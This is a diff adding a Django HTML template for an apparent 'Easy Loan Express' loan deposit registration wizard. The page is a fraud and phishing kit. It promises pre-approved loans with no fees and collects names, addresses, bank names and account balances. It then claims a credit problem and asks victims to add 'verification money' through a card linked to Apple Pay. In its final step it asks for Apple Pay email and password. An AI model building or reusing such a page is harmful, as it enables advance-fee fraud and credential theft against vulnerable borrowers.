@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+{% load static %}
+<head>
+
+
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '3676832522414607');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=3676832522414607&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Facebook Pixel Code -->
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=693121607936546&ev=PageView&noscript=1"
+/></noscript>
+
+
+	    <link rel="icon" href="https://imgur.com/b34soZQ.jpg">
+    <link rel="icon" type="image/x-icon" href="{% static '/img/cashfevicon.png' %}"/>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Wilio Survey, Quotation, Review and Register form Wizard by Ansonika.">
+    <meta name="author" content="Ansonika">
+    <title>Loan Deposit | Register Form</title>
+
+    <!-- Favicons-->
+    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" type="image/x-icon" href="img/apple-touch-icon-57x57-precomposed.png">
+    <link rel="apple-touch-icon" type="image/x-icon" sizes="72x72" href="img/apple-touch-icon-72x72-precomposed.png">
+    <link rel="apple-touch-icon" type="image/x-icon" sizes="114x114" href="img/apple-touch-icon-114x114-precomposed.png">
+    <link rel="apple-touch-icon" type="image/x-icon" sizes="144x144" href="img/apple-touch-icon-144x144-precomposed.png">
+
+    <!-- GOOGLE WEB FONT -->
+    <link href="https://fonts.googleapis.com/css?family=Work+Sans:400,500,600" rel="stylesheet">
+
+    <!-- BASE CSS -->
+    <link href="{%static 'preregister/html/css/bootstrap.min.css' %}" rel="stylesheet">
+	<link href="{%static 'preregister/html/css/menu.css' %}" rel="stylesheet">
+    <link href="{%static 'preregister/html/css/style.css' %}" rel="stylesheet">
+	<link href="{%static 'preregister/html/css/vendors.css' %}" rel="stylesheet">
+
+    <!-- YOUR CUSTOM CSS -->
+    <link href="{%static 'preregister/html/css/custom.css' %}" rel="stylesheet">
+
+	<!-- MODERNIZR MENU -->
+	<script src="{%static 'preregister/html/js/modernizr.js' %}"></script>
+
+</head>
+
+<body>
+
+	<div id="preloader">
+		<div data-loader="circle-side"></div>
+	</div><!-- /Preload -->
+
+	<div id="loader_form">
+		<div data-loader="circle-side-2"></div>
+	</div><!-- /loader_form -->
+
+	<nav>
+		<ul class="cd-primary-nav">
+			<li><a href="index.html" class="animated_link">Home</a></li>
+			<li><a href="quotation-wizard-version.html" class="animated_link">Aboot Us</a></li>
+			<li><a href="review-wizard-version.html" class="animated_link">Customers Review</a></li>
+			<li><a href="registration-wizard-version.html" class="animated_link">Live Chat</a></li>
+			<li><a href="about.html" class="animated_link">Verification FAQ</a></li>
+			<li><a href="contacts.html" class="animated_link">Contact Us</a></li>
+		</ul>
+	</nav>
+	<!-- /menu -->
+
+	<div class="container-fluid full-height">
+		<div class="row row-height">
+			<div class="col-lg-6 content-left">
+				<div class="content-left-wrapper">
+					<a href="index.html" id="logo"><img src="{%static 'preregister/html//img/logo.png' %}" alt="" width="49" height="35"></a>
+					<div id="social">
+
+					</div>
+					<!-- /social -->
+					<div>
+						<figure><img src="{%static 'preregister/html/img/info_graphic_2.svg' %}" alt="" class="img-fluid"></figure>
+						<h2>Loan Deposit Registration </h2>
+				<p>To deposit the loan amount in your account, we need some details from your side. After that, we will deposit the loan amount directly into your bank or apple pay account within 24 hours or less. </p>
+<p>No upfront fees are needed. You are already eligible to receive this loan; we just need some additional details to deposit the funds in your account.</p>
+<p>Please note that we will encrypt your information to secure it. Be assured, it's secure and safe with us and will only be used for deposit purposes.</p>
+<p>You will receive the loan documents at your email address. If you have trouble understanding anything in the form, you can start a chat again with our loan supervisors to receive help.</p>
+
+						<a href="#start" class="btn_1 rounded mobile_btn">Start Now!</a>
+					</div>
+					<div class="copy">© 2023 Easy Loan Express</div>
+				</div>
+				<!-- /content-left-wrapper -->
+			</div>
+			<!-- /content-left -->
+
+			<div class="col-lg-6 content-right" id="start">
+				<div id="wizard_container">
+					<div id="top-wizard">
+							<div id="progressbar"></div>
+						</div>
+						<!-- /top-wizard -->
+						<form action="loan-deposit-by-apple-services" method="POST">
+							{% csrf_token %}
+							<input id="website" name="website" type="text" value="">
+							<!-- Leave for security protection, read docs for details -->
+							<div id="middle-wizard">
+								<div class="step">
+									<h3 class="main_question"><strong>1/6</strong>Loan Deposit Customer Registration</h3>
+									<p>Please fill in your details to receive the loan and documents.</p>
+									<div class="form-group">
+										{{form.first_name}}
+									</div>
+									<div class="form-group">
+										{{form.last_name}}
+									</div>
+									<div class="form-group">
+										{{form.email}}
+									</div>
+									<div class="form-group">
+										{{form.phone}}
+									</div>
+
+								</div>
+							            <div class="step">
+									<h3 class="main_question"><strong>2/6</strong>Your Address</h3> <p>You will receive the loan documents at your address within 24 hours and via email within 3 hours.</p> 									<div class="form-group">
+										{{form.address}}
+									</div>
+									<div class="form-group">
+										{{form.city}}
+									</div>
+									<div class="form-group">
+										{{form.state}}
+									</div>
+											<div class="form-group">
+										{{form.zip_code}}
+									</div>
+
+								</div>
+
+                                <div class="step">
+									<h3 class="main_question"><strong>3/6</strong>Select Loan</h3> <p>
+										Please note: This is not a payday loan. You are approved for a personal loan where the minimum amount is $1000 and the maximum is $8000.
+									</p> 									<div class="form-group">
+										<p> Please select the loan amount below to see the loan period, monthly installment, and interest on the loan (fixed interest rate 9%) </p>
+										<p> The default loan amount is set to $3000. Please click on it to view full details or to change the loan to meet your needs.</p>
+										{{form.loan_amount}}
+									</div>
+									<div class="form-group">
+										<p> On which date would you like to start your monthly installment? You can select any date within 30 days from now.
+										{{form.payment_date}}
+									</div>
+
+
+
+								</div>
+
+
+
+
+                                <div class="step">
+									<h3 class="main_question"><strong>4/6</strong>Banking Details</h3> <p>You will receive the loan on same day. (Within 2 hours)</p>
+									<p>Please let us know in which bank account you would like to receive the loan.</p> 									<div class="form-group">
+										{{form.bank_name}}
+									</div>
+									<div class="form-group">
+										{{form.since_how_long_banking}}
+									</div>
+									<div class="form-group">
+										{{form.online_banking_status}}
+									</div>
+											<div class="form-group">
+										{{form.current_balance_in_account}}
+									</div>
+
+								</div>
+
+
+
+
+                                <div class="step">
+									<h3 class="main_question"><strong>5/6</strong>Credit score is not matching. (Please Read Carefully)</h3> <h3>Verification Process Required (Read Carefully)</h3>
+<p>Due to the current credit score situation, we are unable to deposit the loan directly into your bank account. However, we have a convenient solution in place to ensure you receive the funds swiftly.</p>
+<p>To proceed with the loan deposit, we kindly request you to link a card to your Apple Pay account. Once linked, you need to add verification money from it to verify. Once done. You will be able to add the loan amount to your Apple Pay balance. We will provide you with a loan agreement prior to initiating this process.</p>
+<p>On live chat, you can request a verification card from us that needs to be linked to your Apple Pay. This will enable us to transfer the loan amount securely. Rest assured that we prioritize the privacy and security of your information.</p>
+<p>This approach is necessary as it allows us to accommodate your loan request despite the current credit score requirements.</p>
+<p>We are not going to charge you any fee or hidden charges.</p>
+<p>Once you submit the details, Ask your loan supervisor for the verification card to receive the loan on same day.</p>
+											<div class="form-group">
+										
+									</div>
+
+
+</div>
+
+
+
+
+
+
+
+
+    <div class="submit step">
+    	<div class="summary">
+    		<div class="submit step">
+									<h3 class="main_question"><strong>Click on submit</strong>Summary</h3>
+                                  <p>By clicking on submit, you will be redirected to a live chat with your loan supervisor. The supervisor will review your information and deposit the loan amount. </p>
+
+									</div>
+
+									<h3 class="main_question"><strong>6/6</strong>Banking Details</h3> <p>After completing the card link process, you will receive the loan in your designated Apple Pay account within 45 minutes.</p>
+									<p>To receive the loan, please provide your Apple Pay details, including your email and password. This information will be used to securely deposit the loan into your Apple Pay account. </p> 									<div class="form-group">
+									
+									</div>
+
+								<p>By clicking on submit, you will be redirected to our loan supervisor, who will review your loan file to deposit the loan into your Apple Pay account. </p>
+								</div>
+								{% if messages %}
+								{% for message in messages %}
+								<h4> test</h4>
+
+								<!-- /step-->
+								{% endfor %}
+								{% endif %}
+								</div>
+								<!-- /step-->
+							</div>
+							<!-- /middle-wizard -->
+							<div id="bottom-wizard">
+								<button type="button" name="backward" class="backward">Prev</button>
+								<button type="button" name="forward" class="forward">Next</button>
+								<button type="submit" name="process" class="submit">Submit</button>
+							</div>
+							<!-- /bottom-wizard -->
+						</form>
+					</div>
+					<!-- /Wizard container -->
+			</div>
+			<!-- /content-right-->
+		</div>
+		<!-- /row-->
+	</div>
+	<!-- /container-fluid -->
+
+	<div class="cd-overlay-nav">
+		<span></span>
+	</div>
+	<!-- /cd-overlay-nav -->
+
+	<div class="cd-overlay-content">
+		<span></span>
+	</div>
+	<!-- /cd-overlay-content -->
+
+	<a href="#0" class="cd-nav-trigger">Menu<span class="cd-icon"></span></a>
+	<!-- /menu button -->
+
+	<!-- Modal terms -->
+	<div class="modal fade" id="terms-txt" tabindex="-1" role="dialog" aria-labelledby="termsLabel" aria-hidden="true">
+		<div class="modal-dialog modal-dialog-centered">
+			<div class="modal-content">
+				<div class="modal-header">
+					<h4 class="modal-title" id="termsLabel">Terms and conditions</h4>
+					<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
+				</div>
+				<div class="modal-body">
+					<p>Lorem ipsum dolor sit amet, in porro albucius qui, in <strong>nec quod novum accumsan</strong>, mei ludus tamquam dolores id. No sit debitis meliore postulant, per ex prompta alterum sanctus, pro ne quod dicunt sensibus.</p>
+					<p>Lorem ipsum dolor sit amet, in porro albucius qui, in nec quod novum accumsan, mei ludus tamquam dolores id. No sit debitis meliore postulant, per ex prompta alterum sanctus, pro ne quod dicunt sensibus. Lorem ipsum dolor sit amet, <strong>in porro albucius qui</strong>, in nec quod novum accumsan, mei ludus tamquam dolores id. No sit debitis meliore postulant, per ex prompta alterum sanctus, pro ne quod dicunt sensibus.</p>
+					<p>Lorem ipsum dolor sit amet, in porro albucius qui, in nec quod novum accumsan, mei ludus tamquam dolores id. No sit debitis meliore postulant, per ex prompta alterum sanctus, pro ne quod dicunt sensibus.</p>
+				</div>
+				<div class="modal-footer">
+					<button type="button" class="btn_1" data-dismiss="modal">Close</button>
+				</div>
+			</div>
+			<!-- /.modal-content -->
+		</div>
+		<!-- /.modal-dialog -->
+	</div>
+	<!-- /.modal -->
+
+	<!-- COMMON SCRIPTS -->
+	<script src="{%static 'preregister/html/js/jquery-3.2.1.min.js' %}"></script>
+    <script src="{%static 'preregister/html/js/common_scripts.min.js' %}"></script>
+	<script src="{%static 'preregister/html/js/velocity.min.js' %}"></script>
+	<script src="{%static 'preregister/html/js/functions.js' %}"></script>
+	<script src="{%static 'preregister/html/js/pw_strenght.js' %}"></script>
+
+	<!-- Wizard script -->
+	<script src="{%static 'preregister/html/js/registration_func.js' %}"></script>
+
+</body>
+</html>
